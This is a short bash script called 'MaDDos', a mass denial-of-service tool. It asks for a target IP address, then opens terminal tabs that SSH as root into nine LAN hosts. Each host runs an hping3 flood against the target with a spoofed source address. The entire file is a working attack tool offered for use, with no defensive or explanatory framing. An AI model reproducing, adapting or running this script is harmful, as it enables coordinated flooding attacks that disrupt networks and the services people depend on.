#!/bin/bash

echo "|||MaDDos|||"

echo "
Mass DDOS tool Developed by Amal
"
echo "FYI, this tool is under development. Do it with your own risk."
read -p "Enter IP Address in Network to DDOS : " dos

echo "Attack Has Been Started to $dos . "


gnome-terminal --tab --title="1" -e "ssh root@192.168.2.184 'hping3 -a 127.0.0.1  $dos --flood'" --tab --title="2" -e "ssh root@192.168.2.178 'hping3 -a 127.0.0.1 $dos --flood'" --tab --title="3" -e "ssh root@192.168.2.76 'hping3 -a 127.0.0.1 $dos --flood'" --tab --title="4" -e "ssh root@192.168.2.21 'hping3 -a 127.0.0.1 $dos --flood'" --tab --title="5" -e "ssh root@192.168.2.196 'hping3 -a 127.0.0.1 $dos --flood'" --tab --title="6" -e "ssh root@192.168.2.103 'hping3 -a 127.0.0.1 $dos --flood'" --tab --title="7" -e "ssh root@192.168.2.246 'hping3 -a 127.0.0.1 $dos --flood'" --tab --title="8" -e "ssh root@192.168.2.69 'hping3 -a 127.0.0.1 $dos --flood'" --tab --title="9" -e "ssh root@192.168.2.203 'hping3 -a 127.0.0.1 $dos --flood'"

